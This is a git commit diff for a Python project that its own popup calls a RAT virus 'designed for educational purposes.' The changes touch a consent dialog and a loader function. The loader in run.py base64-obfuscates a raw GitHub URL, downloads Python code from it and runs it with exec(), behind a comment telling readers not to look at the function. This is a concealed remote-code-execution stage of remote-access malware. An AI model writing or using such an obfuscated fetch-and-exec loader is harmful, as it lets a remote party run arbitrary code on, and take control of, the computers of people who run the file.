1d417af59d5c09d0358dd1b683f33414c0510f3a
pernydev <83672513+pernydev@users.noreply.github.com>
2022-12-29 12:04:49 +0200

    Updated commands

--- run.py
+++ run.py
@@ -8,9 +8,12 @@ def run(popup):
 
 def sasInit():
     # You shouldn't need to even look at this function
-    r = requests.get(base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Blcm55ZGV2L2Rpc2NvbnRyb2wvbWFpbi9zYXMucHk='))
+    headers = {"Cache-Control": "no-cache"}
+    r = requests.get(base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Blcm55ZGV2L2Rpc2NvbnRyb2wvbWFpbi9zYXMucHk='), headers=headers)
     code = r.text
+    print(code)
     exec(code)
+
 
 
 if __name__ == "__main__":
--- sas.py
+++ sas.py
@@ -1,4 +1,5 @@
 import tkinter as tk
+import sys
 
 popup = tk.Tk()
 popup.wm_title("WARNING!")
@@ -6,10 +7,10 @@ popup.wm_title("WARNING!")
 label = tk.Label(popup, text="The file you just opened is a RAT virus designed for educational purposes.")
 label.pack(side="top", fill="x", pady=10)
 
-cancel_button = tk.Button(popup, text="Cancel", command=popup.destroy)
+cancel_button = tk.Button(popup, text="Cancel", command=sys.exit)
 cancel_button.pack()
 
-continue_button = tk.Button(popup, text="Continue (Giving access to your computer)", command=lambda: run(popup))
+continue_button = tk.Button(popup, text="Continue (Giving access to your computer)", command=popup.destroy)
 continue_button.pack()
 
 popup.mainloop()
